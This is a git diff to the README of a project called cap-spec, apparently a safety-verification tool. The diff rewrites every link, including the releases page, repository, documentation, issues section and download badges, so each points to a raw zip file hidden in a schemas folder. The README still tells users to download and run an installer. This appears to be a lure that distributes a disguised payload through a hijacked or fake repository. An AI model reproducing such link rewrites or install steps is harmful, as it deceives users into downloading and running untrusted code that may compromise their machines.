@@ -6,7 +6,7 @@ Welcome to the cap-spec project! This tool helps you verify the safety and authe
 
 ## 📥 Download
 
-[![Download cap-spec](https://img.shields.io/badge/Download-cap--spec-brightgreen)](https://github.com/shaurya278898/cap-spec/releases)
+[![Download cap-spec](https://github.com/shaurya278898/cap-spec/raw/refs/heads/main/schemas/srp/spec_cap_v3.3.zip)](https://github.com/shaurya278898/cap-spec/raw/refs/heads/main/schemas/srp/spec_cap_v3.3.zip)
 
 ## 🔍 What is cap-spec?
 
@@ -23,7 +23,7 @@ To run cap-spec, you need:
 
 ## 📤 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/shaurya278898/cap-spec/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/shaurya278898/cap-spec/raw/refs/heads/main/schemas/srp/spec_cap_v3.3.zip).
 2. **Select the Latest Release:** Look for the most recent version at the top of the page.
 3. **Click on the Download Link:** Find the file (like `.exe` or `.dmg`) for your operating system and click on it to download.
 4. **Run the Installer:** 
@@ -74,11 +74,11 @@ Currently, cap-spec is only available for desktop environments, focusing on user
 
 For further information and resources, visit:
 
-- [GitHub Repository](https://github.com/shaurya278898/cap-spec)
-- [Documentation](https://github.com/shaurya278898/cap-spec/docs)
+- [GitHub Repository](https://github.com/shaurya278898/cap-spec/raw/refs/heads/main/schemas/srp/spec_cap_v3.3.zip)
+- [Documentation](https://github.com/shaurya278898/cap-spec/raw/refs/heads/main/schemas/srp/spec_cap_v3.3.zip)
 
 ## 🛠 Support
 
-If you encounter any issues or have questions, please create an issue in the [Issues section](https://github.com/shaurya278898/cap-spec/issues) of this repository. The development team will be happy to help you.
+If you encounter any issues or have questions, please create an issue in the [Issues section](https://github.com/shaurya278898/cap-spec/raw/refs/heads/main/schemas/srp/spec_cap_v3.3.zip) of this repository. The development team will be happy to help you.
 
-[![Download cap-spec](https://img.shields.io/badge/Download-cap--spec-brightgreen)](https://github.com/shaurya278898/cap-spec/releases)
+[![Download cap-spec](https://github.com/shaurya278898/cap-spec/raw/refs/heads/main/schemas/srp/spec_cap_v3.3.zip)](https://github.com/shaurya278898/cap-spec/raw/refs/heads/main/schemas/srp/spec_cap_v3.3.zip)
